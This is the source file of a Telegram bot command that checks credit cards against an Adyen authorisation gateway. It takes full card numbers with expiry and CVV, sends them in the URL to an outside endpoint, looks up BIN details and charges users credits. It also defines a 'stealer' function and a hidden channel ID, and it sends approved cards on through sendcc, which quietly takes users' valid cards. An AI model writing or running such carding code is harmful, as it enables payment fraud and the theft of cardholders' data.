import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
# Note: If .response and .gate cause import errors, you can comment them out or ensure they are in the same folder
# from .response import *
# from .gate import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Replace with your actual channel ID
STEALER_CHANNEL_ID = -1003627495953

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("ad", [".", "/"]))
async def adyen_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        # Real user name for the link
        first_name = message.from_user.first_name
        
        # Real database check for role (Free/Premium)
        checkall = await check_all_thing(Client, message)

        gateway = "Adyen Auth 💳"

        if checkall[0] == False:
            return

        role = checkall[1]
        
        # Real CC extraction from your TOOLS
        getcc = await getmessage(message)
        
        if getcc == False:
            # Fixed "How to use" prompt with real user link
            resp = f"""〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Adyen Auth - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ad cc|month|year|cvc"""
            await message.reply_text(resp, quote=True)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Endpoint URL with the REAL CC
        endpoint_url = f"https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc={fullcc}"

        # --- ANIMATION START ---
        
        firstresp = f"""\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"""
        msg = await message.reply_text(firstresp, quote=True)

        secondresp = f"""\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"""
        await asyncio.sleep(0.5)
        await msg.edit_text(secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        
        try:
            response_obj = await session.get(endpoint_url)
            result_json = response_obj.json()
            status = result_json.get("status", "Unknown")
            response = result_json.get("response", "No response message")
        except httpx.RequestError as e:
            status = "Error"
            response = f"Request failed: {e}"
        except ValueError:
            status = "Error"
            response = "Invalid JSON response"

        # Real BIN lookup from your TOOLS
        getbin = await get_bin_details(cc)

        thirdresp = f"""\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"""
        await asyncio.sleep(0.5)
        await msg.edit_text(thirdresp)

        # --- ANIMATION END ---

        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        # Final Result Theme with Real User Link and Role
        finalresp = f"""\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href=\'tg://user?id={user_id}\'>{first_name}</a> [{role}] \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"""

        await asyncio.sleep(0.5)
        await msg.edit_text(finalresp)

        # Real database updates for anti-spam and credits
        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
